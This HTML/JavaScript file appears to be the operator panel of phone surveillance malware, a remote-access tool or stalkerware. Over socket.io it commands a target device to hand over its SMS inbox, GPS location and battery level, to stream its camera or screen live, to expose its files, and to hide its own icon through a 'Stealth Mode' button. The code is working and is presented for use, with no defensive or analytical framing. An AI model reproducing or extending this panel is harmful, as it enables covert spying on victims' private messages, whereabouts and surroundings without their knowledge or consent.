<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Master Dashboard - System Sync</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --sidebar: #2c3e50; --teal: #1abc9c; --blue: #3498db; --red: #e74c3c; --win-hover: #e5f3ff; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; background: #f4f7f6; overflow: hidden; }
        
        .sidebar { width: 250px; background: var(--sidebar); color: white; display: flex; flex-direction: column; flex-shrink: 0; }
        .sidebar-header { padding: 20px; background: #1a252f; font-weight: bold; font-size: 1.2rem; }
        .nav-item { padding: 15px 25px; display: flex; align-items: center; color: #bdc3c7; cursor: pointer; transition: 0.3s; }
        .nav-item:hover, .nav-item.active { background: #3e5871; color: white; border-left: 5px solid var(--teal); }
        .nav-item i { margin-right: 15px; width: 20px; text-align: center; }

        .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .content { flex: 1; padding: 25px; overflow-y: auto; }

        /* Status Tiles */
        .status-row { display: flex; gap: 20px; margin-bottom: 30px; }
        .tile { background: white; flex: 1; border-radius: 8px; display: flex; box-shadow: 0 2px 5px rgba(0,0,0,0.1); overflow: hidden; }
        .tile-icon { width: 70px; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #fff; }
        .tile-body { padding: 15px; flex: 1; }
        .tile-body label { display: block; font-size: 0.75rem; font-weight: bold; color: #7f8c8d; text-transform: uppercase; }
        .tile-body span { font-size: 1.1rem; font-weight: 500; }

        /* SMS Table Styling */
        .data-table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .data-table th { background: #f8f9fa; padding: 15px; text-align: left; border-bottom: 2px solid #eee; color: #333; }
        .data-table td { padding: 12px 15px; border-bottom: 1px solid #eee; font-size: 0.9rem; color: #555; }
        .data-table tr:hover { background: #f1f8ff; }

        /* Large Video Overlay with Full Screen */
        .video-overlay {
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 85%; max-width: 1000px; background: #000; border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8); z-index: 9999; border: 2px solid #444;
        }
        .video-overlay.fullscreen { width: 100vw; height: 100vh; max-width: none; border-radius: 0; border: none; }
        .video-header { padding: 15px 20px; background: #222; color: #fff; display: flex; justify-content: space-between; align-items: center; }
        .video-body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 450px; position: relative; }
        #live-img { width: 100%; height: auto; max-height: 75vh; object-fit: contain; }
        .video-overlay.fullscreen #live-img { max-height: 90vh; }
        .video-footer { padding: 15px; text-align: center; background: #222; border-radius: 0 0 12px 12px; }

        .btn-main { width: 100%; max-width: 300px; padding: 12px; background: var(--red); color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin: 20px auto; display: block; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">System Sync</div>
        <div class="nav-item active" onclick="showTab('dashboard')"><i class="fa fa-home"></i> Dashboard</div>
        <div class="nav-item" onclick="showTab('sms')"><i class="fa fa-envelope"></i> SMS Logs</div>
        <div class="nav-item" onclick="showTab('live')"><i class="fa fa-video"></i> Live Viewing</div>
        <div class="nav-item" onclick="showTab('explorer')"><i class="fa fa-folder-open"></i> File Explorer</div>
        <div class="nav-item" onclick="sendCmd('hide-icon')" style="color:#f39c12; margin-top: auto;"><i class="fa fa-eye-slash"></i> Stealth Mode</div>
    </div>

    <div class="main">
        <div class="content">
            <div class="status-row">
                <div class="tile"><div class="tile-icon" style="background:var(--teal)"><i class="fa fa-link"></i></div><div class="tile-body"><label>Status</label><span>Connected</span></div></div>
                <div class="tile"><div class="tile-icon" style="background:var(--red)"><i class="fa fa-battery-half"></i></div><div class="tile-body" style="background:var(--red); color:white"><label style="color:white">Battery</label><span id="stat-batt">0 %</span></div></div>
                <div class="tile" style="flex:2"><div class="tile-icon" style="background:var(--blue)"><i class="fa fa-map-marker-alt"></i></div><div class="tile-body" style="background:var(--blue); color:white"><label style="color:white">GPS Location</label><span id="stat-gps">Waiting...</span></div></div>
            </div>

            <div id="tab-sms" style="display:none">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                    <h2>SMS Inbox</h2>
                    <button onclick="sendCmd('get-sms')" style="padding:8px 15px; cursor:pointer"><i class="fa fa-sync"></i> Refresh SMS</button>
                </div>
                <table class="data-table">
                    <thead>
                        <tr><th>Number</th><th>Message</th><th>Date</th></tr>
                    </thead>
                    <tbody id="sms-body">
                        <tr><td colspan="3" style="text-align:center">No SMS data loaded. Click Refresh.</td></tr>
                    </tbody>
                </table>
            </div>

            <div id="tab-live" style="display:none">
                <h3 style="text-align:center">Start Streaming</h3>
                <div style="display:flex; justify-content:center; gap:20px; margin:20px;">
                    <button class="nav-item" style="color:#333; border:1px solid #ddd; background:white" onclick="setMode('video')"><i class="fa fa-camera"></i> Camera</button>
                    <button class="nav-item" style="color:#333; border:1px solid #ddd; background:white" onclick="setMode('screen')"><i class="fa fa-desktop"></i> Screen</button>
                </div>
                <div id="cam-opts" style="text-align:center">
                    <select id="cam-sel" style="padding:10px; width:200px"><option value="0">Back Camera</option><option value="1">Front Camera</option></select>
                </div>
                <button class="btn-main" onclick="startStreaming()">LAUNCH LIVE STREAM</button>
            </div>
            
            </div>
    </div>

    <div id="video-overlay" class="video-overlay">
        <div class="video-header">
            <span id="stream-type">LIVE VIEW</span>
            <div>
                <i class="fa fa-expand" onclick="toggleFullScreen()" style="cursor:pointer; margin-right:15px;" title="Full Screen"></i>
                <i class="fa fa-times" onclick="stopStreaming()" style="cursor:pointer" title="Close"></i>
            </div>
        </div>
        <div class="video-body">
            <div id="loader" style="color:white; position:absolute;">Connecting to device...</div>
            <img id="live-img" src="">
        </div>
        <div class="video-footer">
            <button onclick="stopStreaming()" style="background:var(--red); color:white; border:none; padding:10px 25px; border-radius:4px; cursor:pointer">TERMINATE CONNECTION</button>
        </div>
    </div>

    <script>
        const socket = io();
        let curMode = 'video';
        socket.emit('register', 'web');

        function sendCmd(c) { socket.emit('phone-execute', c); }
        function showTab(t) {
            ['dashboard', 'sms', 'live', 'explorer'].forEach(id => {
                const el = document.getElementById('tab-'+id);
                if(el) el.style.display = (id===t?'block':'none');
            });
        }

        // --- FULL SCREEN LOGIC ---
        function toggleFullScreen() {
            const overlay = document.getElementById('video-overlay');
            overlay.classList.toggle('fullscreen');
        }

        function setMode(m) {
            curMode = m;
            document.getElementById('cam-opts').style.visibility = (m==='video'?'visible':'hidden');
        }

        function startStreaming() {
            document.getElementById('loader').style.display = 'block';
            let cmd = curMode === 'screen' ? "stream:0:screen" : `stream:${document.getElementById('cam-sel').value}:video`;
            sendCmd(cmd);
            document.getElementById('video-overlay').style.display = 'block';
        }

        function stopStreaming() {
            sendCmd('stop-stream');
            document.getElementById('video-overlay').style.display = 'none';
            document.getElementById('video-overlay').classList.remove('fullscreen');
            document.getElementById('live-img').src = "";
        }

        // --- DATA HANDLERS ---
        socket.on('data-stream', (base64) => { 
            document.getElementById('live-img').src = "data:image/jpeg;base64," + base64; 
            document.getElementById('loader').style.display = 'none';
        });

        // Dashboard is listening for this event from the server
socket.on('battery-update', (v) => { 
    document.getElementById('stat-batt').innerText = v + " %"; 
});
        socket.on('location-update', (d) => { 
            document.getElementById('stat-gps').innerText = d.lat + ", " + d.lng; 
        });

        socket.on('sms-data', (data) => {
            const smsList = JSON.parse(data);
            const body = document.getElementById('sms-body');
            body.innerHTML = smsList.map(s => `
                <tr>
                    <td style="font-weight:bold">${s.address}</td>
                    <td>${s.body}</td>
                    <td style="white-space:nowrap">${new Date(parseInt(s.date)).toLocaleString()}</td>
                </tr>
            `).join('');
        });
    </script>
</body>
</html>
